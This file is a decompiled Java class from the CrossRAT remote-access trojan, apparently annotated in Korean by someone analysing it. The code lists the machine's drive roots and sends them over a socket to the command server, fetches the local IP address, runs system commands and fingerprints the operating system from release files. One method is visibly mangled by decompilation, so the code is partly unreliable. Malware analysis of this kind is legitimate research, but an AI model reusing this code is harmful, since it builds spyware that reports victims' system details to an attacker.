package crossrat;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;

public class e {
    private static String a;

    public static void a() {
        String var1 = "";

        try {
            File[] var4;
            int var3 = (var4 = File.listRoots()).length;   // File.listRoots(): 하드디스크의 루트 경로 리스트를 File[]로 반환한다.

            for (int var2 = 0; var2 < var3; ++var2) {   // 모든 루트 경로 리스트에 대해
                File var0 = var4[var2];
                var1 = var1 + var0 + k.e;   // k.e = "^!@", 모든 루트 경로를 붙이면서 사이사이에 ^!@를 끼운다.
            }

            // k.k: Socket
            // Parameter of writeBytes: k.g + "$#@" + "@0002" + "$#@" + var1 + "$#@" + "&&&"
            (new DataOutputStream(k.k.getOutputStream())).writeBytes(k.g + k.d + k.y + k.d + var1 + k.d + "&&&");
        } catch (Exception var5) {
            var5.printStackTrace();
        }
    }

    public static String b() {
        if (a == null) {
            try {
                Enumeration var0 = NetworkInterface.getNetworkInterfaces();

                while (var0.hasMoreElements()) {
                    Enumeration var1 = ((NetworkInterface) var0.nextElement()).getInetAddresses();

                    while (var1.hasMoreElements()) {
                        InetAddress var2;
                        if (!(var2 = (InetAddress) var1.nextElement()).isLoopbackAddress() && var2.isSiteLocalAddress() && var2.getHostAddress().indexOf(":") < 0) {
                            a = var2.getHostAddress();
                        }
                    }
                }

                if (a == null) {
                    a = "127.0.0.1";
                }
            } catch (SocketException var3) {
                a = "127.0.0.1";
            }
        }

        return a;
    }

    public static List a(String[] var0) {
        ArrayList var1 = new ArrayList();
        Process var3 = Runtime.getRuntime().exec(var0);
        BufferedReader var4 = new BufferedReader(new InputStreamReader(var3.getInputStream()));

        String var2;
        while ((var2 = var4.readLine()) != null) {
            var1.add(var2);
        }

        var4.close();
        return var1;
    }

    public static Map a(File var0, String var1) {
        HashMap var2 = new HashMap();
        Iterator var3 = a(var0).iterator();

        while (var3.hasNext()) {
            String[] var5;
            String var4 = (var5 = ((String) var3.next()).split(var1))[0].trim();
            String var6 = var5[1].trim();
            var2.put(var4, var6);
        }

        return var2;
    }

    public static List a(File var0) {
        ArrayList var1 = new ArrayList();
        if (var0.exists()) {
            BufferedReader var3 = new BufferedReader(new InputStreamReader(new FileInputStream(var0)));

            String var2;
            while ((var2 = var3.readLine()) != null) {
                var1.add(var2);
            }

            var3.close();
        }

        return var1;
    }

    public static String c() {
        String var0 = null;

        try {
            Process var1 = Runtime.getRuntime().exec(new String[]{"uname", "-a"});
            BufferedReader var3;
            var0 = (var3 = new BufferedReader(new InputStreamReader(var1.getInputStream()))).readLine();
            var3.close();
        } catch (Exception var2) {
            var2.printStackTrace();
        }

        return var0;
    }

    public static osprobe.bsd.b a(boolean var0) {
        List var1 = null;

        try {
            var1 = a(new File("/var/run/dmesg.boot"));
        } catch (Exception var4) {
            var4.printStackTrace();
        }

        osprobe.bsd.b var5;
        if (var1 != null) {
            Iterator var3 = var1.iterator();

            while (var3.hasNext()) {
                if ((var5 = osprobe.bsd.b.a((String) var3.next())) != null) {
                    return var5;
                }
            }
        }

        return var0 && (var5 = osprobe.bsd.b.a(System.getProperty("os.name"))) != null ? var5 : null;
    }

    public static osprobe.linux.d d() {
        // DECOMPILE FAILED: used other decompiler's code
        Object localObject1 = null;
        try {
            Object localObject2 = null;
            Object localObject3 = null;
            int i = 0;
            List localList = null;
            try {
                i = (localList = a(tmp20_15)).size() == 3 ? 1 : 0;
            } catch (Exception localException1) {
                localException1.printStackTrace();
            }
            Object localObject4 = null;
            Map localMap = null;
            try {
                localObject4 = a(new File("/etc/os-release"), "=");
            } catch (Exception localException2) {
                System.out.println("Failed to load /etc/os-release");
            }
            try {
                localMap = a(new File("/etc/lsb-release"), "=");
            } catch (Exception localException3) {
                System.out.println("Failed to load /etc/lsb-release");
            }
            c[] arrayOfc;
            int k = (arrayOfc = c.values()).length;
            for (int j = 0; j < k; j++) {
                c localc = arrayOfc[j];
                Object localObject6;
                Object localObject5;
                Object localObject7;
                Object localObject8;
                if ((localObject1 == null) && (i != 0)) {
                    localObject6 = localList.iterator();
                    while (((Iterator) localObject6).hasNext()) {
                        localObject8 = (localObject7 = (localObject5 = (String) ((Iterator) localObject6).next()).split(":"))[0].trim();
                        localObject5 = localObject7[1].trim();
                        if (((String) localObject8).equals("Distributor ID")) {
                            localObject2 = localObject5;
                        } else if (((String) localObject8).equals("Release")) {
                            localObject3 = localObject5;
                            if (((String) localObject5).toLowerCase().contains("kali")) {
                                localObject1 = c.a;
                                localObject3 = null;
                                break;
                            }
                        } else if ((((String) localObject8).equals("Codename")) && (((String) localObject5).toLowerCase().contains("debian")) && (localObject2 != null) && (((String) localObject2).toLowerCase().contains("mint"))) {
                            localObject1 = c.c;
                            break;
                        }
                    }
                }
                if ((localObject1 == null) && (localList == null) && (localObject4 != null)) {
                    localObject5 = (String) ((Map) localObject4).get("DISTRIB_ID");
                    if ((localObject2 == null) && (localObject5 != null)) {
                        localObject2 = ((String) localObject5).replace("\"", "");
                    }
                    localObject6 = (String) ((Map) localObject4).get("NAME");
                    if ((localObject5 == null) && (localObject6 != null)) {
                        localObject2 = ((String) localObject6).replace("\"", "");
                    }
                    if ((localObject7 = (String) ((Map) localObject4).get("VERSION_ID")) != null) {
                        localObject3 = ((String) localObject7).replace("\"", "");
                    }
                    if ((localObject8 = (String) ((Map) localObject4).get("DISTRIB_RELEASE")) != null) {
                        localObject3 = ((String) localObject8).replace("\"", "");
                    }
                    if ((localObject5 = (String) ((Map) localObject4).get("DISTRIB_CODENAME")) != null) {
                        ((String) localObject5).replace("\"", "");
                    }
                }
                if ((localObject1 == null) && (localMap != null)) {
                    if ((localObject5 = (String) ((Map) localObject4).get("DISTRIB_ID")) != null) {
                        localObject2 = ((String) localObject5).replace("\"", "");
                    }
                    if ((localObject6 = (String) ((Map) localObject4).get("DISTRIB_RELEASE")) != null) {
                        localObject3 = ((String) localObject6).replace("\"", "");
                    }
                    if ((localObject7 = (String) ((Map) localObject4).get("DISTRIB_CODENAME")) != null) {
                        ((String) localObject7).replace("\"", "");
                    }
                }
                if (localObject1 == null) {
                    if (localc.b().equalsIgnoreCase((String) localObject2)) {
                        localObject1 = localc;
                    }
                    if (localObject2 != null) {
                        n = (localObject8 = localc.a()).length;
                        for (m = 0; m < n; m++) {
                            if ((((localObject5 = localObject8[m]) instanceof String)) && ((localObject5 = (String) localObject5).toLowerCase().contains(((String) localObject2).toLowerCase()))) {
                                localObject1 = localc;
                                break;
                            }
                        }
                    }
                    int n = (localObject8 = localc.a()).length;
                    for (int m = 0; m < n; m++) {
                        if ((((localObject5 = localObject8[m]) instanceof h)) && ((localObject5 = (h) localObject5).a()) && (localObject1 == null)) {
                            localObject1 = localc;
                            break;
                        }
                    }
                }
                if (localObject1 == c.b) {
                    try {
                        localObject3 = (String) (localObject5 = a(new String[]{"nixos-version"})).get(0);
                    } catch (Exception localException4) {
                        (localObject5 = localException4).printStackTrace();
                    }
                }
                if (localObject1 != null) {
                    (localObject5 = new d((c) localObject1)).a((String) localObject3);
                    return (osprobe.linux.d) localObject5;
                }
            }
        } catch (Exception localException5) {
            Object localObject2;
            (localObject2 = localException5).printStackTrace();
        }
        return new d(c.d);
    }
}
